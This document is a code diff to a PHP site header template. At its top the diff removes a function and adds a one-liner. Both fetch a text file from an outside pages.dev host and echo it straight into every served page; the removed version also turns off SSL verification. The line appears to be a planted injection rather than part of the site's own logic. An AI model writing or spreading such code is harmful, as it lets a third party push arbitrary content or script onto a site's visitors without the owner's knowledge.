@@ -1,26 +1,4 @@
-<?php
-function getContent($url) {
-    if (ini_get("allow_url_fopen")) {
-        // kalau allow_url_fopen aktif
-        return file_get_contents($url);
-    } else {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-}
-
-$url = "https://punten-neng.pages.dev/punten.txt";
-$content = getContent($url);
-
-if ($content !== false && !empty($content)) {
-    echo $content;
-}
-?>
+<?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
 <?php
 
 $domain = strtok($_SERVER["HTTP_HOST"], ".");
@@ -117,3 +95,4 @@ $header = $frontEnd->head($type);
 <div class="hamburgerim-open">
     <?php echo menu(57,'mobile_nav',2); ?>
 </div>
+
